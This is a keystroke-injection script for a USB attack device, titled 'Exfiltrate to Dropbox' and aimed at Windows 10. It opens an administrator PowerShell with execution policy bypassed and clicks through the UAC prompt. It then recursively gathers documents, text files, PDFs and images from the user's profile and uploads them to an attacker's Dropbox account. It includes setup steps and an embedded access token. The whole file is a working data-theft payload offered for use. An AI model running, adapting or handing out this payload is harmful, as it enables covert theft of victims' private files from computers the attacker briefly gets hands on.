// =============================================================================
// Title: Exfiltrate to Dropbox
// Author: @beigeworm | https://github.com/beigeworm
// Description: Exfiltrate specified filetypes to Dropbox .
// Target: Windows 10
// =============================================================================

// *USB SETTING*
// startup

// *SETUP*
// make an app at https://www.dropbox.com/developers/apps (make sure to grant full access to your new app)
// generate an access token for your app and replace DROPBOX_ACCESS_TOKEN_HERE.

// =============================================================================

// script setup
layout("us")

// Open Powershell as Admin
press("GUI r");
delay(1000);
type("powershell -NoP -NonI -Exec Bypass");
delay(500);
press("CONTROL SHIFT ENTER");
delay(3000);
press("ALT y");
delay(4000);

// Main Powershell code
type("$accessToken = \"sl.BfOs10PaIXKrdYUcBKxCCmHCnhLI6WYNQE3ARc1CDeeMRBDRGaMsaKbi3QrCyim5NeOGQPfC9wSZHkZWDelpslxSbKIp0UJkiLPdYS9QT2khPOaeE9V9yZTNSbyGoxVOAJnVyLQx5CE\"");
type(";$localFolderPath = \"$env:USERPROFILE\"; $computerName = \"$env:COMPUTERNAME\"; $dropboxCreateFolderUrl = \"https://api.dropboxapi.com/2/files/create_folder_v2\"");
type(";$dropboxFolderPath = $computerName.ToString(); $dropboxUploadUrl = \"https://content.dropboxapi.com/2/files/upload\" ");
press("ENTER");
delay(500);
type("$headers = @{\"Authorization\" = \"Bearer $accessToken\"");
press("ENTER");
delay(500);
type("\"Content-Type\" = \"application/octet-stream\"}");
press("ENTER");
delay(500);
type("$body = @{\"path\" = \"/$computerName\"");
press("ENTER");
delay(500);
type("\"autorename\" = $true}| ConvertTo-Json; $files = Get-ChildItem -Path $localFolderPath -Include \"*.docx\",\"*.txt\",\"*.pdf\",\"*.jpg\",\"*.png\" -Recurse ");
press("ENTER");
delay(500);
type("foreach($file in $files){$relativePath = $file.FullName.Replace($localFolderPath, '').TrimStart('\') ");
type(";$dropboxFilePath = \"$dropboxFolderPath/$relativePath\".Replace('\\', '/') ");
type(";$headers[\"Dropbox-API-Arg\"] = \"{`\"path`\": `\"/$dropboxFilePath`\", `\"mode`\": `\"add`\", `\"autorename`\": true, `\"mute`\": false}\"");
type(";try{$fileBytes = [System.IO.File]::ReadAllBytes($file.FullName) ");
type(";$response = Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes}catch{}}");
delay(500);
press("ENTER");

